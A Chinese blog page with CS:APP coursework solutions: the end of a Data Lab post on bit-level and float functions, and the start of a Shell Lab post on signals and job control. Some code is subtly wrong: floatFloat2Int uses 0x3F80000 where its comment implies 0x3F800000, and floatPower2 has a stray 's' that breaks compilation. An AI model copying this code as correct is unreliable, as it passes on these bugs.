class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//最多需要多少位才能表示x</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//对负数取反，正数不变，此时从左到右第一个1的下标+1就是答案</span></span><br><span class="line">  <span class="comment">//先将x变为 000..001xx..xx的形式(x可以是0也可以是1)</span></span><br><span class="line">  <span class="keyword">int</span> top=(<span class="number">1</span>&lt;&lt;<span class="number">31</span>)&amp;x; <span class="comment">//取x最高位</span></span><br><span class="line">  <span class="comment">//将x变为000..00111..1的形式，</span></span><br><span class="line">  <span class="keyword">int</span> tmp;</span><br><span class="line">  <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> ans=<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">int</span> tst=<span class="number">1</span>&lt;&lt;<span class="number">15</span>;</span><br><span class="line">  <span class="keyword">int</span> stm2;</span><br><span class="line">  <span class="keyword">int</span> stm1;</span><br><span class="line">  x=x^(top&gt;&gt;<span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">  tmp=x&gt;&gt;<span class="number">1</span>; x=x|tmp;<span class="comment">//2</span></span><br><span class="line">  tmp=x&gt;&gt;<span class="number">2</span>; x=x|tmp;  <span class="comment">//4</span></span><br><span class="line">  tmp=x&gt;&gt;<span class="number">4</span>; x=x|tmp; <span class="comment">//8</span></span><br><span class="line">  tmp=x&gt;&gt;<span class="number">8</span>; x=x|tmp; <span class="comment">//16</span></span><br><span class="line">  tmp=x&gt;&gt;<span class="number">16</span>; x=x|tmp; <span class="comment">//32</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//二分法找到最右侧的0的下标</span></span><br><span class="line">  cur=tst&amp;x;</span><br><span class="line">  <span class="comment">//根据cur决定左移还是右移</span></span><br><span class="line">  stm1=(!cur)+(~<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">  stm2=~stm1;</span><br><span class="line">  tst=tst&lt;&lt;(stm1&amp;<span class="number">8</span>);  tst=tst&gt;&gt;(stm2&amp;<span class="number">8</span>); </span><br><span class="line">  ans=ans+(stm1&amp;<span class="number">8</span>); ans=ans+(stm2&amp;(~<span class="number">8</span>+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  cur=tst&amp;x;</span><br><span class="line">  stm1=(!cur)+(~<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">  stm2=~stm1;</span><br><span class="line">  tst=tst&lt;&lt;(stm1&amp;<span class="number">4</span>);  tst=tst&gt;&gt;(stm2&amp;<span class="number">4</span>); </span><br><span class="line">  ans=ans+(stm1&amp;<span class="number">4</span>);  ans=ans+(stm2&amp;(~<span class="number">4</span>+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  cur=tst&amp;x;</span><br><span class="line">  stm1=(!cur)+(~<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">  stm2=~stm1;</span><br><span class="line">  tst=tst&lt;&lt;(stm1&amp;<span class="number">2</span>);  tst=tst&gt;&gt;(stm2&amp;<span class="number">2</span>); </span><br><span class="line">  ans=ans+(stm1&amp;<span class="number">2</span>);  ans=ans+(stm2&amp;(~<span class="number">2</span>+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  cur=tst&amp;x;</span><br><span class="line">  stm1=(!cur)+(~<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">  stm2=~stm1;</span><br><span class="line">  tst=tst&lt;&lt;(stm1&amp;<span class="number">1</span>);  tst=tst&gt;&gt;(stm2&amp;<span class="number">1</span>); </span><br><span class="line">  ans=ans+(stm1&amp;<span class="number">1</span>);  ans=ans+(stm2&amp;(~<span class="number">1</span>+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//注意最后一次不能漏,参考样例0x80000000就可以明白为什么需要加这一次</span></span><br><span class="line">  cur=tst&amp;x;</span><br><span class="line">  stm1=(!cur)+(~<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">  ans=ans+(stm1&amp;<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>后续的函数全部涉及到浮点数的操作，所以限制规则也发生的改变，变得更加宽松</strong></p>
<p>浮点数规则：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 浮点数规则:</span></span><br><span class="line"><span class="comment">//可以使用:</span></span><br><span class="line"><span class="comment">//循环和条件控制语句</span></span><br><span class="line"><span class="comment">//可以使用int和unsigned类型</span></span><br><span class="line"><span class="comment">//使用任意的int或unsigned常量</span></span><br><span class="line"><span class="comment">//可以使用基于int或unsigned的任何算术，逻辑，比较运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不能使用:</span></span><br><span class="line"><span class="comment">//定义和使用宏</span></span><br><span class="line"><span class="comment">//定义和调用函数</span></span><br><span class="line"><span class="comment">//强制类型转换</span></span><br><span class="line"><span class="comment">//使用int和unsigned外的其他数据类型</span></span><br><span class="line"><span class="comment">//使用任何浮点数据类型，操作符和常量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//dlc不仅会检查你的代码是否符合以上标准</span></span><br><span class="line"><span class="comment">//还会更进一步检查你使用的各种运算符的数量是否超出上限(=不会被计数，它可以被任意使用)</span></span><br><span class="line"><span class="comment">//运算符使用上限会在每个函数上方给出</span></span><br></pre></td></tr></table></figure>



<h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//结果要求返回浮点数结果2*f，如果参数是NaN，直接返回参数</span></span><br><span class="line"><span class="comment">//所有输入和返回的参数都使用unsigned类型表示，但是我们应该将它看作是浮点类型</span></span><br><span class="line"><span class="comment">//uf就是浮点数f</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123; </span><br><span class="line">  <span class="comment">//如果是NaN或无限大，直接返回参数</span></span><br><span class="line">  <span class="keyword">unsigned</span> tmp=uf&amp;<span class="number">0x7F800000</span>u;</span><br><span class="line">  <span class="keyword">unsigned</span> checkNaN=tmp^<span class="number">0x7F800000</span>u;</span><br><span class="line">  <span class="keyword">unsigned</span> ans;</span><br><span class="line">  <span class="keyword">unsigned</span> norm=tmp;</span><br><span class="line">  <span class="keyword">if</span>(!checkNaN || !uf)&#123;</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//非规格化数左移一位</span></span><br><span class="line">  <span class="keyword">if</span>(!norm)&#123;</span><br><span class="line">    tmp=uf&lt;&lt;<span class="number">1</span>;</span><br><span class="line">    ans=(uf&amp;<span class="number">0x80000000</span>u)+(tmp&amp;<span class="number">0x7FFFFFFF</span>u);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//规格化数对阶码+1</span></span><br><span class="line">    tmp=uf+<span class="number">0x00800000</span>u;</span><br><span class="line">    ans=(uf&amp;<span class="number">0x807FFFFF</span>u)+(tmp&amp;<span class="number">0x7F800000</span>u);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//将浮点数f转换为int返回，超出表示返回的浮点数都转换为0x80000000u</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123; <span class="comment">//127次方最多,-126次方最少</span></span><br><span class="line">  <span class="comment">//通过阶码先区分出越界的数</span></span><br><span class="line">  <span class="keyword">unsigned</span> tmp=uf&amp;<span class="number">0x7F800000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> checkNaN=tmp^<span class="number">0x7F800000</span>u;</span><br><span class="line">  <span class="keyword">int</span> ans;</span><br><span class="line">  <span class="keyword">int</span> M;</span><br><span class="line">  <span class="keyword">int</span> mov;</span><br><span class="line">  <span class="keyword">if</span>(!checkNaN)   <span class="comment">//无限大和NaN</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="comment">////阶码大于等于127+31的数溢出，实际上0xCF000000是不会溢出的，但是它的转换结果就是0x80000000</span></span><br><span class="line">  <span class="keyword">if</span>(tmp&gt;=<span class="number">0x4F000000</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(tmp&lt;<span class="number">0x3F80000</span>) <span class="comment">//阶码小于127，则可以直接返回0，因为int无法表示那么小的数(非常接近0的小数) </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    ans=<span class="number">0</span>;</span><br><span class="line">    M=uf&amp;<span class="number">0x007FFFFF</span>;</span><br><span class="line">    mov=tmp&gt;&gt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0x4B000000</span>)   <span class="comment">//当阶码小于(127+23),则需要将尾数M右移，反之左移</span></span><br><span class="line">      ans=ans+((M+<span class="number">0x00800000</span>)&gt;&gt;(<span class="number">150</span>-mov));</span><br><span class="line">    <span class="keyword">else</span>                 <span class="comment">//阶码大于等于(127+23),需要将位数左移</span></span><br><span class="line">      ans=ans+((M+<span class="number">0x00800000</span>)&lt;&lt;(mov<span class="number">-150</span>));</span><br><span class="line">    <span class="keyword">if</span>(uf&gt;&gt;<span class="number">31</span>)  <span class="comment">//前面都是默认正数情况，如果符号位为1需要将结果转为负数</span></span><br><span class="line">      ans=~ans+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//返回2^x数的浮点数形式</span></span><br><span class="line"><span class="comment">//如果数值过小无法表示则返回0，如果数值过大返回+INF</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">unsigned</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!x)  <span class="keyword">return</span> <span class="number">0x3f800000</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;<span class="number">127</span>)     <span class="comment">//超出表达范围</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x7F800000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&lt;<span class="number">-149</span>) <span class="comment">//float能表达的最小正数是0x00000001(非规格化数)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//2^x的浮点表示为非规格化数</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">-126</span>)&#123;</span><br><span class="line">      x=~(x+<span class="number">126</span>)+<span class="number">1</span>;</span><br><span class="line">      ans=<span class="number">0x00800000</span>&gt;&gt;x;</span><br><span class="line">      <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">//2^x的浮点表示为规格化数</span></span><br><span class="line">      ans=ans+(((x+<span class="number">127</span>)&amp;<span class="number">0x000000FF</span>)&lt;&lt;<span class="number">23</span>);</span><br><span class="line">      <span class="keyword">return</span> ans;s</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/csapp-shellLab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/30/csapp-shellLab/" class="post-title-link" itemprop="url">csapp-shellLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-08-30 00:03:34" itemprop="dateCreated datePublished" datetime="2020-08-30T00:03:34+08:00">2020-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-04 16:50:35" itemprop="dateModified" datetime="2020-09-04T16:50:35+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CSAPP-shell-lab"><a href="#CSAPP-shell-lab" class="headerlink" title="CSAPP-shell lab"></a>CSAPP-shell lab</h2><p>本次实验的内容是完成一个简易的shell程序。</p>
<p>在开始实验之前请大家仔细阅读官网的write up，理解程序的要求以及作者给出的hint。</p>
<p>write up：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/shlab.pdf">http://csapp.cs.cmu.edu/3e/shlab.pdf</a></p>
<p>这一次实验的内容和书上第八章的内容联系非常紧密，程序的一部分实现和corner case的书中也有介绍，请在认真阅读第八章（特别是进程控制和信号这两部分）</p>
<p>这一次的shell lab，write up只给出了对程序的大概要求，而具体的一些要求则需要通过我们观察trace文件得到。所以可以从trace01开始，边读trace边改进自己的程序。</p>
<p>官网的压缩包中还包含了tshref可执行文件，类似于cache lab中的csim-ref文件一样，对于每一个trace，tshref提供正确的运行结果。我们的目标就是使得自己编写的tsh文件能够得到和tshref相同的结果。</p>
<p>我们只需要填补tsh.c中空缺的7个函数：</p>
<ol>
<li><p>eval ：主循环，解析输入的命令行</p>
</li>
<li><p>builtin_cmd：辨别并执行内置命令（quit，fg，bg，jobs）</p>
</li>
<li><p>do_bgfg：执行bg和fg内置命令</p>
</li>
<li><p>waitfg：显式等待前台进程执行结束</p>
</li>
<li><p>sigchld_handler：捕获SIGCHLD信号</p>
</li>
<li><p>sigint_handler：捕获SIGINT信号</p>
</li>
<li><p>sigtstp_hander：捕获SIGTSTP信号</p>
</li>
</ol>
<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>首先填写eval函数，它是我们程序的一个核心，但是关于eval的实现，可以参考书上8.4节给出的样例，但是注意，书上的程序没有考虑关于信号的问题，但是我们不能忽略信号。</p>
<p>根据8.5信号中提到的父子进程竞争，可能导致在父进程addjob之前，子进程就结束，触发对deletejob的调用。为了解决竞争，需要在fork子进程之前，阻塞SIGCHLD信号，直到父进程addjob之后再解除SIGCHLD信号的阻塞。</p>
<p>另一方面，在write up中提到，为了确保SIGINT和SIGTSTP只作用于前台进程，需要在fork之后，修改子进程的进程组号，调用setpgid(0,0)，使得子进程的进程组号等于其进程号，这样就能保证只会有一个进程处于前台进程组。</p>
<p>(默认情况下，子进程会继承父进程的进程组号，所以我们才需要手动修改子进程的进程组号)</p>
<p>下面给出我的eval代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* argv[MAXARGS];</span><br><span class="line">    <span class="keyword">int</span> bg_fg;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all,mask_one,prev_one;</span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one,SIGCHLD);</span><br><span class="line"></span><br><span class="line">    bg_fg=parseline(cmdline,argv); <span class="comment">//分割读入的命令行</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123; <span class="comment">//识别并处理内置命令</span></span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask_one,&amp;prev_one);  <span class="comment">//阻塞SIG_CHLD，防止竞争</span></span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>)&#123;</span><br><span class="line">            setpgid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">            sigprocmask(SIG_SETMASK,&amp;prev_one,<span class="literal">NULL</span>); <span class="comment">//子进程继承父进程的阻塞集合，需要解除阻塞</span></span><br><span class="line">            <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//execve会将子进程的信号处理函数置为默认</span></span><br><span class="line">                <span class="comment">//无需手动将SIGINT和SIGTSTP的处理程序改为默认行为</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="literal">NULL</span>);</span><br><span class="line">        addjob(jobs,pid,bg_fg+<span class="number">1</span>,cmdline);   <span class="comment">//添加作业</span></span><br><span class="line">        sigprocmask(SIG_SETMASK,&amp;prev_one,<span class="literal">NULL</span>); <span class="comment">//解除阻塞</span></span><br><span class="line">        <span class="keyword">if</span>(bg_fg==<span class="number">0</span>)&#123;</span><br><span class="line">            waitfg(pid);  <span class="comment">//等待前台进程结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;   </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid),pid,cmdline);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="builtin-command"><a href="#builtin-command" class="headerlink" title="builtin_command"></a>builtin_command</h3><p>这个函数需要判断输入的命令行中是否包含内置命令，如果包含内置命令则应该在主进程中马上执行，如果不包含内置命令则返回。</p>
<p>具体实现较为简单，不做过多说明。</p>
<p>下面给出我的builtin_cmd代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>))&#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>))&#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>之后是waitfg函数，主进程通过调用waitfg函数来显式的等待某个子进程（前台进程）执行结束。</p>
<p>这里的实现书上有过相关的讨论，最终决定使用sigsuspend来实现。</p>
<p>下面给出我的waifg代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">sig_atomic_t</span> waitPidMark=<span class="number">0</span>; <span class="comment">//全局变量，用于检测子进程是否结束</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> wait;</span><br><span class="line">    sigemptyset(&amp;wait);</span><br><span class="line">    waitPidMark=pid;</span><br><span class="line">    <span class="keyword">while</span>(waitPidMark)</span><br><span class="line">        sigsuspend(&amp;wait);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h3><p>对于内置命令bg和fg，单独使用一个do_bgfg来实现它们。简单来说不管是bg还是fg命令，主要的操作就是向对应的进程组发送SIGCONT命令，然后改变作业的状态。但是根据trace14的信息，我们还需要对命令行中bg，fg的参数做一定的约束，对于不满足约束的参数输出提示信息。</p>
<p>下面给出我的do_bgfg代码：</p>
